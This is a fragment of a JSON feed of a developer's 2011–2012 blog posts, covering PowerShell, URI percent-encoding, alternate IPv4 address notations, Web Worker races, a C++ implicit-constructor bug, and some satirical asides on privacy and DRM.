			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  According to <a href=\"http://sequelguy.tumblr.com/post/19438594681\">MSDN</a> the proper way to permanently add a path to your system's PATH environment variable is by modifying a registry value.\n  Accordingly this is easily represented in a PowerShell script that first checks if the path provided is already there and otherwise appends it:\n  <pre><code>param([Parameter(Mandatory = $true)] [string] $Path);<br>$FullPathOriginal = (gp \"HKLM:\\System\\CurrentControlSet\\Control\\Session Manager\\Environment\").Path;<br>if (!($FullPathOriginal.split(\";\") | ?{ $_ -like $Path })) {<br>    sp \"HKLM:\\System\\CurrentControlSet\\Control\\Session Manager\\Environment\" -name Path -value ($FullPathOriginal + \";\" +<br> $Path);<br>}</code></pre></div></div>\n",
			"date_published": "2012-05-17T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-05/PowerShell+Equivalents+for+JavaScript+Array+Functions/",
			"url": "https://deletethis.net/dave/2012-05/PowerShell+Equivalents+for+JavaScript+Array+Functions/",
			"title": "PowerShell Equivalents for JavaScript Array Functions",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><h4>\n    Built-in\n  </h4><dl><dt>\n      map\n    </dt><dd>\n      input | %{ expression($_) }\n    </dd><dt>\n      forEach\n    </dt><dd>\n      input | %{ [void]expression($_) }\n    </dd><dt>\n      filter\n    </dt><dd>\n      input | ?{ expression($_) }\n    </dd><dt>\n      indexOf\n    </dt><dd>\n      input.indexOf(value)\n    </dd></dl><h4>\n    Close to built-in\n  </h4><dl><dt>\n      some\n    </dt><dd>\n      if (input | ?{ expression($_) }) { ... }\n    </dd><dt>\n      every\n    </dt><dd>\n      if (-not input | ?{ !expression($_) }) { ... }\n    </dd><dt>\n      lastIndexOf\n    </dt><dd>\n      [array]::lastIndexOf(input, value)\n    </dd></dl><h4>\n    Write it yourself\n  </h4><dl><dt>\n      reduce\n    </dt><dd>\n      function reduce($fn, $a, $init) { $s = $init; $a | %{ $s = &amp;$fn $s $_; }; $s; }\n    </dd></dl></div></div>\n",
			"date_published": "2012-05-15T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-05/Favorite+Windows+8+Feature-+Intra-Line+Tab+Completion/",
			"url": "https://deletethis.net/dave/2012-05/Favorite+Windows+8+Feature-+Intra-Line+Tab+Completion/",
			"title": "Favorite Windows 8 Feature: Intra-Line Tab Completion",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Fixed in Windows 8 is intra-line tab completion - you can try it out on the <a href=\"http://windows.microsoft.com/en-US/windows-8/consumer-preview\">Windows 8 Consumer Preview</a> now. If you open\n    a command prompt, type a command, then move your cursor back into a token in the middle of the command and tab complete, the tab completion works on that whitespace delimited token and doesn't\n    erase all text following the cursor. Like it does in pre Windows 8. And annoys the hell out of me. Yay!\n  </p></div></div>\n",
			"date_published": "2012-05-09T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-05/Play+Fez/",
			"url": "https://deletethis.net/dave/2012-05/Play+Fez/",
			"title": "Play Fez",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><iframe src=\"http://player.vimeo.com/video/40269839?color=ff9933\" width=\"500\" height=\"281\" frameborder=\"0\" webkitallowfullscreen=\"\" mozallowfullscreen=\"\" allowfullscreen=\"allowfullscreen\"></iframe><p>\n    I'm done playing <a href=\"http://polytroncorporation.com/what-is-fez\">Fez</a>. The style is atmospheric retro nastalgia and on the surface the gameplay is standard 2D platformer with one\n    interesting Flatland style game mechanic but dig deeper to find Myst style puzzles. Despite the following I thoroughly enjoyed the game and would recommend it to anyone intrigued by the previous.\n    Five eighths through the game I ran into one of the game's infamous <a href=\"http://polytroncorporation.com/fez-issues\">Fez save game breaking issues</a>, but I enjoyed the game enough that I\n    started over before any patches were released and had no further issues.\n  </p><p>\n    While playing the game I created some tools to help keep track of <a href=\"http://deletethis.net/dave/dev/fez/\">my Fez notes (spoilers)</a> including a <a href=\"http://deletethis.net/dave/dev/fez/pixelatedDataUriGenerator.html\">Pixelated Image Creator</a> that makes it easy to generate data URIs for large, black and white pixelated images, and\n    (spoilers) a <a href=\"http://deletethis.net/dave/dev/fez/fezTransliteration.html\">Fez Transliteration Tool</a> to help me translate the in-game writing system.\n  </p></div></div>\n",
			"date_published": "2012-05-07T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-03/Why+Did+This+Work-/",
			"url": "https://deletethis.net/dave/2012-03/Why+Did+This+Work-/",
			"title": "Why Did This Work?",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Do we have a word or phrase to describe the following situation: You code up something complicated and it compiles and works on the first try. You then spend the next ten minutes trying to figure\n    out what's actually broken because it shouldn't be this easy.\n  </p><p>\n    Or in meme form:<br><a href=\"http://www.quickmeme.com/meme/3ofxwf/\"><img src=\"http://i.qkme.me/3ofxwf.jpg\"></a></p></div></div>\n",
			"date_published": "2012-03-23T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-03/Alternate+IPv4+Forms+-+URI+Host+Syntax+Notes/",
			"url": "https://deletethis.net/dave/2012-03/Alternate+IPv4+Forms+-+URI+Host+Syntax+Notes/",
			"title": "Alternate IPv4 Forms - URI Host Syntax Notes",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    By the <a href=\"http://tools.ietf.org/html/rfc3986#section-7.4\">URI RFC</a> there is only one way to represent a particular IPv4 address in the host of a URI. This is the standard dotted decimal\n    notation of four bytes in decimal with no leading zeroes delimited by periods. And no leading zeros are allowed which means there's only one textual representation of a particular IPv4 address.\n  </p><p>\n    However as discussed in the URI RFC, there are other forms of IPv4 addresses that although not officially allowed are generally accepted. Many implementations used <a href=\"http://www.freebsd.org/cgi/man.cgi?query=inet_aton&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+9.0-RELEASE&amp;arch=default&amp;format=html\">inet_aton</a> to parse the address from the URI which accepts more\n    than just dotted decimal. Instead of dotted decimal, each dot delimited part can be in decimal, octal (if preceded by a '0') or hex (if preceded by '0x' or '0X'). And that's each section\n    individually - they don't have to match. And there need not be 4 parts: there can be between 1 and 4 (inclusive). In case of less than 4, the last part in the string represents all of the left\n    over bytes, not just one.\n  </p><p>\n    For example the following are all equivalent:\n  </p><dl><dt>\n      192.168.1.1\n    </dt><dd>\n      Standard dotted decimal form\n    </dd><dt>\n      0300.0250.01.01\n    </dt><dd>\n      Octal\n    </dd><dt>\n      0xC0.0XA8.0x1.0X1\n    </dt><dd>\n      Hex\n    </dd><dt>\n      192.168.257\n    </dt><dd>\n      Fewer parts\n    </dd><dt>\n      0300.0XA8.257\n    </dt><dd>\n      All of the above\n    </dd></dl><p>\n    The bread and butter of URI related security issues is when one part of the system disagrees with another about the interpretation of the URI. So this non-standard, non-normal form syntax has\n    been been a great source of security issues in the past. Its mostly well known now (<a href=\"http://msdn.microsoft.com/en-us/library/ie/ms775098(v=vs.85).aspx\">CreateUri</a> normalizes these\n    non-normal forms to dotted decimal), but occasionally a good tool for bypassing naive URI blocking systems.\n  </p></div></div>\n",
			"date_published": "2012-03-14T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-03/Privacy+through+Obscurity/",
			"url": "https://deletethis.net/dave/2012-03/Privacy+through+Obscurity/",
			"title": "Privacy through Obscurity",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    With Facebook changing its privacy policy and settings so frequently and just generally the huge amount of social sites out there, for many of us it is far too late to ensure our name doesn't\n    show up with unfortunate results in web searches. Information is too easily copyable and archive-able to make removing these results a viable option, so clearly the solution is to create more\n    data.\n  </p><p>\n    Create fake profiles on Facebook using your name but with a different photo, different date of birth, and different hometown. Create enough doppelgangers to add noise to the search results for\n    your name. And have them share embarrassing stories on their blogs. The goal is to ensure that the din of your alternates drowns out anything embarrassing showing up for you.\n  </p><p>\n    Although it will look suspicious if you're the only name on Google with such chaff. So clearly you must also do this for your friends and family. Really you'll be doing them a favor.\n  </p></div></div>\n",
			"date_published": "2012-03-09T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-03/HTML5+Table+Flipper+Experiment/",
			"url": "https://deletethis.net/dave/2012-03/HTML5+Table+Flipper+Experiment/",
			"title": "HTML5 Table Flipper Experiment",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    The goal of this experiment was to combine the <a href=\"http://knowyourmeme.com/memes/flipping-tables-%E2%95%AF%E2%96%A1%EF%BC%89%E2%95%AF%EF%B8%B5-%E2%94%BB%E2%94%81%E2%94%BB\">flipping tables\n    emoticons</a> with the <a href=\"http://www.youtube.com/watch?v=gAYL5H46QnQ&amp;ob=av3e\">Threw It On The Ground video</a> using shiny new HTML5-ish features and the end result is <a href=\"http://deletethis.net/dave/dev/flip/\">the table flipper flipping the Threw It On the Ground video</a>.\n  </p><p>\n    The table flipper emoticon is CSS before content that changes on hover. Additionally on hover a CSS transform is applied to flip the video upside down several times and move it to the right and\n    there's a CSS transition to animate the flipping. The only issue I ran into is that (at least on Windows) Flash doesn't like to have CSS transform rotations applied to it. So to get the most out\n    of the flip experiment you must <a href=\"http://www.youtube.com/html5\">opt-in to HTML5 video on YouTube</a>. And of course you must use a browser that supports the various things I just\n    mentioned, like the latest Chrome (or not yet released IE10).\n  </p></div></div>\n",
			"date_published": "2012-03-02T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/Glitch+Helperator/",
			"url": "https://deletethis.net/dave/2012-02/Glitch+Helperator/",
			"title": "Glitch Helperator",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I've been working on the <a href=\"http://deletethis.net/dave/dev/glitch-helperator/\">Glitch Helperator</a>. It is a collection of tools and things I've put together for <a href=\"http://www.glitch.com\">Glitch</a>. It has a few features that I haven't seen elsewhere including:\n  </p><dl><dt>\n      Favorite Streets\n    </dt><dd>\n      A notebook in which you can save information about interesting streets and later use it to find your way back to them.\n    </dd><dt>\n      Birthday\n    </dt><dd>\n      Find out how old your Glitch is and the date of your next birthday in Glitch time or Earth time.\n    </dd><dt>\n      API Update History\n    </dt><dd>\n      A history of changes to the streets, skills and achievements of Glitch noting when new ones are added and when existing ones are changed.\n    </dd></dl>It also has an interactive skill tree, find nearest feature tool, and achievement display. If you play Glitch, check it out.\n</div></div>\n",
			"date_published": "2012-02-29T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/Client+Side+Cross+Domain+Data+YQL+Hack/",
			"url": "https://deletethis.net/dave/2012-02/Client+Side+Cross+Domain+Data+YQL+Hack/",
			"title": "Client Side Cross Domain Data YQL Hack",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    One of the more limiting issues of writing client side script in the browser is the same origin limitations of XMLHttpRequest. The latest version of all browsers support a subset of CORS to allow\n    servers to opt-in particular resources for cross-domain access. Since IE8 there's <a href=\"http://msdn.microsoft.com/en-us/library/cc288060%28v=VS.85%29.aspx\">XDomainRequest</a> and in all other\n    browsers (including <a href=\"http://blogs.msdn.com/b/ie/archive/2012/02/09/cors-for-xhr-in-ie10.aspx\">IE10</a>) there's <a href=\"http://www.w3.org/TR/XMLHttpRequest2/#the-withcredentials-attribute\">XHR L2's cross-origin request features</a>. But the vast majority of resources out on the web do not opt-in using CORS\n    headers and so client side only web apps like a podcast player or a feed reader aren't doable.\n  </p><p>\n    One hack-y way around this I've found is to use <a href=\"http://developer.yahoo.com/yql/console/\">YQL</a> as a CORS proxy. YQL applies the CORS header to all its responses and among its features\n    it allows a caller to request an arbitrary XML, HTML, or JSON resource. So my network helper script first attempts to access a URI directly using XDomainRequest if that exists and XMLHttpRequest\n    otherwise. If that fails it then tries to use XDR or XHR to access the URI via YQL. I wrap my URIs in the following manner, where type is either \"html\", \"xml\", or \"json\":\n  </p><pre><code>        yqlRequest = function(uri, method, type, onComplete, onError) {<br>            var yqlUri = \"http://query.yahooapis.com/v1/public/yql?q=\" + <br>                encodeURIComponent(\"SELECT * FROM \" + type + ' where url=\"' + encodeURIComponent(uri) + '\"');<br><br>            if (type == \"html\") {<br>                yqlUri += encodeURIComponent(\" and xpath='/*'\");<br>            }<br>            else if (type == \"json\") {<br>                yqlUri += \"&amp;callback=&amp;format=json\";<br>            }<br>            ...<br><br></code></pre>This\n  also means I can get JSON data itself without having to go through JSONP.\n</div></div>\n",
			"date_published": "2012-02-27T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/Web+Worker+Initialization+Race/",
			"url": "https://deletethis.net/dave/2012-02/Web+Worker+Initialization+Race/",
			"title": "Web Worker Initialization Race",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Elaborating on a previous brief post on the topic of <a href=\"http://deletethis.net/dave/?uri=http%3A%2F%2Flists.whatwg.org%2Fpipermail%2Fhelp-whatwg.org%2F2010-August%2F000606.html\">Web Worker\n    initialization race conditions</a>, there's two important points to avoid a race condition when setting up a Worker:\n  </p><ol><li>The parent starts the communication posting to the worker.\n    </li><li>The worker sets up its message handler in its first synchronous block of execution.\n    </li></ol><p>\n    For example the following has no race becaues the spec guarentees that messages posted to a worker during its first synchronous block of execution will be queued and handled after that block. So\n    the worker gets a chance to setup its onmessage handler. No race:\n  </p><pre><code>'parent.js':<br>   var worker = new Worker();<br>   worker.postMessage(\"initialize\");<br><br>'worker.js':<br>   onmessage = function(e) {<br>      // ...<br>   }</code></pre><p>\n    The following has a race because there's no guarentee that the parent's onmessage handler is setup before the worker executes postMessage. Race (violates 1):\n  </p><pre><code>'parent.js':<br>   var worker = new Worker();<br>   worker.onmessage = function(e) {<br>      // ...<br>   };<br><br>'worker.js':<br>   postMessage(\"initialize\");<br></code></pre><p>\n    The following has a race because the worker has no onmessage handler set in its first synchronous execution block and so the parent's postMessage may be sent before the worker sets its onmessage\n    handler. Race (violates 2):\n  </p><pre><code>'parent.js':<br>   var worker = new Worker();<br>   worker.postMessage(\"initialize\");<br><br>'worker.js':<br>   setTimeout(<br>      function() {<br>         onmessage = function(e) {<br>            // ...<br>         }<br>      },<br>      0);<br></code></pre></div></div>\n",
			"date_published": "2012-02-24T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/Prime+HTTP+Status+Codes/",
			"url": "https://deletethis.net/dave/2012-02/Prime+HTTP+Status+Codes/",
			"title": "Prime HTTP Status Codes",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  These are the <a href=\"http://www.wolframalpha.com/input/?i=primes+between+100+and+600\">prime</a><a href=\"http://en.wikipedia.org/wiki/Http_status_codes\">HTTP status codes</a>:\n  <ul><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#101\">101 Switching Protocols</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#103\">103 Checkpoint</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#307\">307 Temporary Redirect</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#401\">401 Unauthorized</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#409\">409 Conflict</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#431\">431 Request Header Fields Too Large</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#449\">449 Retry With</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#499\">499 Client Closed Request</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#503\">503 Service Unavailable</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#509\">509 Bandwidth Limit Exceeded</a></li><li><a href=\"http://en.wikipedia.org/wiki/Http_status_codes#599\">599 Network connect timeout error</a></li></ul></div></div>\n",
			"date_published": "2012-02-22T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/URI+Percent+Encoding+Ignorance+Level+2+-+There+is+no+Unencoded+URI/",
			"url": "https://deletethis.net/dave/2012-02/URI+Percent+Encoding+Ignorance+Level+2+-+There+is+no+Unencoded+URI/",
			"title": "URI Percent Encoding Ignorance Level 2 - There is no Unencoded URI",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><i>As a professional URI aficionado I deal with various levels of ignorance on URI percent-encoding (aka URI encoding, or URL escaping).</i></p><p>\n    Getting into the more subtle levels of URI percent-encoding ignorance, folks try to apply their knowledge of percent-encoding to URIs as a whole producing the concepts escaped URIs and unescaped\n    URIs. However there are no such things - URIs themselves aren't percent-encoded or decoded but rather contain characters that are percent-encoded or decoded. Applying percent-encoding or decoding\n    to a URI as a whole produces a new and non-equivalent URI.\n  </p><p>\n    Instead of lingering on the incorrect concepts we'll just cover the correct ones: there's raw unencoded data, non-normal form URIs and normal form URIs. For example:\n  </p><ol type=\"A\"><li>http://example.com/%74%68%65%3F%70%61%74%68?query\n    </li><li>http://example.com/the%3Fpath?query\n    </li><li>\"http\", \"example.com\", \"the?path\", \"query\"\n    </li></ol><p>\n    In the above (A) is not an 'encoded URI' but rather a non-normal form URI. The characters of 'the' and 'path' are percent-encoded but as unreserved characters specific in the RFC should not be\n    encoded. In the normal form of the URI (B) the characters are decoded. But (B) is not a 'decoded URI' -- it still has an encoded '?' in it because that's a reserved character which by the RFC\n    holds different meaning when appearing decoded versus encoded. Specifically in this case, it appears encoded which means it is data -- a literal '?' that appears as part of the path segment. This\n    is as opposed to the decoded '?' that appears in the URI which is not part of the path but rather the delimiter to the query.\n  </p><p>\n    Usually when developers talk about decoding the URI what they really want is the raw data from the URI. The raw decoded data is (C) above. The only thing to note beyond what's covered already is\n    that to obtain the decoded data one must parse the URI before percent decoding all percent-encoded octets.\n  </p><p>\n    Of course the exception here is when a URI <i>is</i> the raw data. In this case you must percent-encode the URI to have it appear in another URI. More on percent-encoding while constructing URIs\n    later.\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-2514262428576226729?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2012-02-20T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/Why+I+Like+Glitch/",
			"url": "https://deletethis.net/dave/2012-02/Why+I+Like+Glitch/",
			"title": "Why I Like Glitch",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Sarah and I have been enjoying <a href=\"http://www.glitch.com\">Glitch</a> for a while now. Reviews are <a href=\"http://arstechnica.com/gaming/news/2011/11/glitch-the-battle-to-build-a-massive-multiplayer-game-without-combat.ars\">usually positive</a> although occasionally <a href=\"http://www.rockpapershotgun.com/2011/10/04/review-glitch/\">biting (but mostly accurate)</a>.\n  </p><p>\n    I enjoy Glitch as a game of exploration: exploring the game's lands with hidden and secret rooms, and exploring the games skills and game mechanics. The issue with my enjoyment coming from\n    exploration is that after I've explored all streets and learned all skills I've got nothing left to do. But I've found that even after that I can have fun writing client side JavaScript against\n    <a href=\"http://developer.glitch.com/\">Glitch's web APIs</a> making tools (I work on the <a href=\"http://deletethis.net/dave/dev/glitch-helperator/\">Glitch Helperator</a>) for use in Glitch. And\n    on a semi-regular basis they add new features reviving my interest in the game itself.\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-6206283866166516855?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2012-02-17T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/URI+Percent-Encoding+Ignorance+Level+1+-+Purpose/",
			"url": "https://deletethis.net/dave/2012-02/URI+Percent-Encoding+Ignorance+Level+1+-+Purpose/",
			"title": "URI Percent-Encoding Ignorance Level 1 - Purpose",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p><i>As a professional URI aficionado I deal with various levels of ignorance on URI percent-encoding (aka URI encoding, or URL escaping).</i></p><p>\n    Worse than the lame blog comments hating on percent-encoding is the shipping code which can do actual damage. In one very large project I won't name, I've fixed code that decodes all\n    percent-encoded octets in a URI in order to get rid of pesky percents before calling ShellExecute. An unnamed developer with similar intent but clearly much craftier did the same thing in a loop\n    until the string's length stopped changing. As it turns out percent-encoding serves a purpose and can't just be removed arbitrarily.\n  </p><p>\n    Percent-encoding exists so that one can represent data in a URI that would otherwise not be allowed or would be interpretted as a delimiter instead of data. For example, the space character\n    (U+0020) is not allowed in a URI and so must be percent-encoded in order to appear in a URI:\n  </p><ol><li><code>http://example.com/the%20path/</code></li><li><code>http://example.com/the path/</code></li></ol>In the above the first is a valid URI while the second is not valid since a space appears directly in the URI. Depending on the context and the code through which the wannabe URI is run one\n  may get unexpected failure.\n  <p>\n    For an additional example, the question mark delimits the path from the query. If one wanted the question mark to appear as part of the path rather than delimit the path from the query, it must\n    be percent-encoded:\n  </p><ol><li><code>http://example.com/foo%3Fbar</code></li><li><code>http://example.com/foo?bar</code></li></ol>In the second, the question mark appears plainly and so delimits the path \"<code>/foo</code>\" from the query \"<code>bar</code>\". And in the first, the querstion mark is percent-encoded and so\n  the path is \"<code>/foo%3Fbar</code>\".\n  <div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-546284491891509604?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2012-02-15T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/Blackmail+DRM+-+Stolen+Thoughts/",
			"url": "https://deletethis.net/dave/2012-02/Blackmail+DRM+-+Stolen+Thoughts/",
			"title": "Blackmail DRM - Stolen Thoughts",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Most existing DRM attempts to only allow the user to access the DRM'ed content with particular applications or with particular credentials so that if the file is shared it won't be useful to\n    others. A better solution is to encode any of the user's horrible secrets into unique versions of the DRM'ed content so that the user won't <i>want</i> to share it. Entangle the users and the\n    content provider's secrets together in one document and accordingly their interests. I call this Blackmail DRM. For an implementation it is important to point out that the user's horrible secret\n    doesn't need to be verified as accurate, but merely verified as believable.\n  </p><p>\n    Apparently I need to get these blog posts written faster because only recently I read about <a href=\"http://www.publishersweekly.com/pw/by-topic/columns-and-blogs/cory-doctorow/article/50413-with-a-little-help-digital-lysenkoism.html\">Social DRM</a> which is a light weight version of my idea\n    but with a misleading name. Instead of horrible secrets, they say they'll use personal information like the user's name in the DRM'ed content. More of my thoughts stolen and before I even had a\n    chance to think of it first!\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-2756638276610953148?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2012-02-13T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2012-02/URI+Percent+Encoding+Ignorance+Level+0+-+Existence/",
			"url": "https://deletethis.net/dave/2012-02/URI+Percent+Encoding+Ignorance+Level+0+-+Existence/",
			"title": "URI Percent Encoding Ignorance Level 0 - Existence",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    As a professional URI aficionado I deal with various levels of ignorance on URI percent-encoding (aka URI encoding, or URL escaping). The basest ignorance is with respect to the mere existence of\n    percent-encoding. Percents in URIs are special: they always represent the start of a percent-encoded octet. That is to say, a percent is always followed by two hex digits that represents a value\n    between 0 and 255 and doesn't show up in a URI otherwise.\n  </p><p>\n    The IPv6 textual syntax for scoped addresses uses the '%' to delimit the zone ID from the rest of the address. When it came time to define <a href=\"http://tools.ietf.org/html/rfc4007#page-19\">how\n    to represent scoped IPv6 addresses in URIs</a> there were two camps: Folks who wanted to use the IPv6 format as is in the URI, and those who wanted to encode or replace the '%' with a different\n    character. The <a href=\"http://www.ietf.org/mail-archive/web/ipv6/current/msg04613.html\">resulting thread</a> was more lively than what shows up on the IETF URI discussion mailing list.\n    Ultimately we went with a percent-encoded '%' which means the percent maintains its special status and singular purpose.\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-1229188482458380028?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2012-02-10T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-12/JavaScript+Array+methods+in+the+latest+browsers/",
			"url": "https://deletethis.net/dave/2011-12/JavaScript+Array+methods+in+the+latest+browsers/",
			"title": "JavaScript Array methods in the latest browsers",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Cool and (relatively) <a href=\"http://dev.opera.com/articles/view/javascript-array-extras-in-detail/\">new methods on the JavaScript Array object</a> are here in the most recent versions of your\n    favorite browser! More about them on <a href=\"http://es5.github.com/#x15.4.4.16\">ECMAScript5</a>, <a href=\"http://msdn.microsoft.com/en-us/library/k4h76zbx(v=VS.94).aspx\">MSDN</a>, the <a href=\"http://blogs.msdn.com/b/ie/archive/2010/06/25/enhanced-scripting-in-ie9-ecmascript-5-support-and-more.aspx\">IE blog</a>, or <a href=\"https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array\">Mozilla's</a> documentation. Here's the list that's got me excited:\n  </p><dl><dt><a href=\"http://es5.github.com/#x15.4.4.17\">some</a> &amp; <a href=\"http://es5.github.com/#x15.4.4.16\">every</a></dt><dd>\n      Does your callback function return true for any (some) or all (every) of the array's elements?\n    </dd><dt><a href=\"http://es5.github.com/#x15.4.4.20\">filter</a></dt><dd>\n      Filters out elements for which your callback function returns false (in a new copy of the Array).\n    </dd><dt><a href=\"http://es5.github.com/#x15.4.4.19\">map</a></dt><dd>\n      Each element is replaced with the result of it run through your callback function (in a new copy of the Array).\n    </dd><dt><a href=\"http://es5.github.com/#x15.4.4.21\">reduce</a> &amp; <a href=\"http://es5.github.com/#x15.4.4.22\">reduceRight</a></dt><dd>\n      Your callback is called on each element in the array in sequence (from start to finish in reduce and from finish to start in reduceRight) with the result of the previous callback call passed to\n      the next. Reduce your array to a single value aggregated in any manner you like via your callback function.\n    </dd><dt><a href=\"http://es5.github.com/#x15.4.4.18\">forEach</a></dt><dd>\n      Simply calls your callback passing in each element of your array in turn. I have vague performance concerns as compared to using a normal for loop.\n    </dd><dt><a href=\"http://es5.github.com/#x15.4.4.14\">indexOf</a> &amp; <a href=\"http://es5.github.com/#x15.4.4.15\">lastIndexOf</a></dt><dd>\n      Finds the first or last (respectively) element in the array that matches the provided value via strict equality operator and returns the index of that element or -1 if there is no such element.\n      Surprisingly, no custom comparison callback method mechanism is provided.\n    </dd><dd><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-4312179088768580080?l=davescoolblog.blogspot.com\" alt=\"\"></div></dd></dl></div></div>\n",
			"date_published": "2011-12-03T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-12/Bug+Spotting-+Ctors+with+default+parameters/",
			"url": "https://deletethis.net/dave/2011-12/Bug+Spotting-+Ctors+with+default+parameters/",
			"title": "Bug Spotting: Ctors with default parameters",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    The following code compiled just fine but did not at all act in the manner I expected:\n  </p><pre><code>BOOL CheckForThing(__in CObj *pObj, __in IFigMgr* pFigMgr, __in_opt LPCWSTR url)<br>{<br>    BOOL fCheck = FALSE;<br>    if (SubCheck(pObj))<br>    {<br>        ...</code></pre>I’m\n  calling SubCheck which looks like:\n  <pre><code>bool SubCheck(const CObj&amp; obj);</code></pre><p>\n    Did you spot the bug? As you can see I should be passing in *pObj not pObj since the method takes a const CObj&amp; not a CObj*. But then why does it compile?\n  </p><p>\n    It works because CObj has a constructor with all but one param with default values and CObj is derived from IUnknown:\n  </p><pre><code>CObj(__in_opt IUnknown * pUnkOuter, __in_opt LPCWSTR pszUrl = NULL);</code></pre>Accordingly C++ uses this constructor as an implicit conversion operator. So instead of passing in my\n  CObj, I end up creating a new CObj on the stack passing in the CObj I wanted as the outer object which has a number of issues.\n  <p>\n    The lesson is unless you really want this behavior, don't make constructors with all but 1 or 0 default parameters. If you need to do that consider using the 'explicit' keyword on the\n    constructor.\n  </p><p>\n    More info about <a href=\"http://stackoverflow.com/questions/174349/forcing-single-argument-constructors-to-be-explicit-in-c\">forcing single argument constructors to be explicit</a> is available\n    on stack overflow.\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-8511896840448096081?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-12-01T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-11/Replacing+Google+Reader+Shared+Feeds+with+Tumblr/",
			"url": "https://deletethis.net/dave/2011-11/Replacing+Google+Reader+Shared+Feeds+with+Tumblr/",
			"title": "Replacing Google Reader Shared Feeds with Tumblr",
